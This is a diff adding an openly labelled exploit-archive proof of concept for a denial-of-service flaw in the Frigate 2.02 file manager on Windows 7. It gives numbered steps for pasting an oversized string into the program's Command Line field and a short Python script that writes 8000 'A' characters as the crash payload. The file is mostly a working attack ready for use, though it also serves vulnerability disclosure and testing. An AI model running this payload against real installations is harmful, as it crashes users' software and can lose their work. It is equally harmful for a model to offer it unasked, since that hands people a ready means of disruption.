@@ -1,0 +1,31 @@
+# Exploit Title: Frigate 2.02 - Denial Of Service (PoC) 
+# Vendor Homepage: http://www.frigate3.com/ 
+# Software Link Download: http://www.frigate3.com/download/Frigate2.exe
+# Exploit Author: Paras Bhatia
+# Discovery Date: 2020-06-22
+# Vulnerable Software: Frigate
+# Version: 2.02
+# Vulnerability Type: Denial of Service (DoS)
+# Tested on: Windows 7 Ultimate Service Pack 1 (32 bit - English)  
+
+#Steps to Produce the Crash:
+
+#   1.- Run python code: FrigateCrash.py
+#   2.- Copy content to clipboard
+#   3.- Open "Frigate2.exe"
+#   4.- Go to "Disk" > "Activate Command Line"
+#   5.- Paste ClipBoard into the "Command Line" field which appears at the bottom of the Frigate application.
+#   6.- Press Enter from Keyboard.
+#   7.- Click on OK in the dialog box that appears.
+#   8.- Crashed.
+
+
+##################################################################################################################################################
+
+
+#Python "FrigateCrash.py" Code:
+
+f= open("FrigateCrash.txt", "w")
+payload="\x41" * 8000
+f.write(payload)
+f.close()
